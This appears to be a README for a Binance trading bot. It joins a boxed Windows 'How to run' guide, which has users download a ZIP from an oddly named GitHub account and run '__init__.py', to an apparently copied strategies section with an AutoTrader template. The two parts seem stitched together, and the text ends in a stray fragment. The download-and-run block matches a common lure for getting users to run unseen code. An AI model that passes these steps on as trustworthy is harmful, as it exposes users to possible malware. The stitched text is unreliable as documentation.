> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/kukuvitaminekcz58/binance-trading-bot/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py __init__.py`
> 
>  or
> 
> `python __init__.py`


# Strategies
You can add your own strategy to this folder. The filename must end with `_strategy.py`,
and contain the following:

```python
from binance_trade_bot.auto_trader import AutoTrader

class Strategy(AutoTrader):

    def scout(self):
        # Your custom scout method

```

Then, set your `strategy` configuration to your strategy name. If you named your file
`custom_strategy.py`, you'd need to put `strategy=custom` in your config file.

You can put your strategy in a subfolder, and the bot will still find it. If you'd like to
share your strategy with others, try using git submodules.

Some premade strategies are listed below:
## `default`

## `multiple_coins`
The bot is less likely to get stuck

d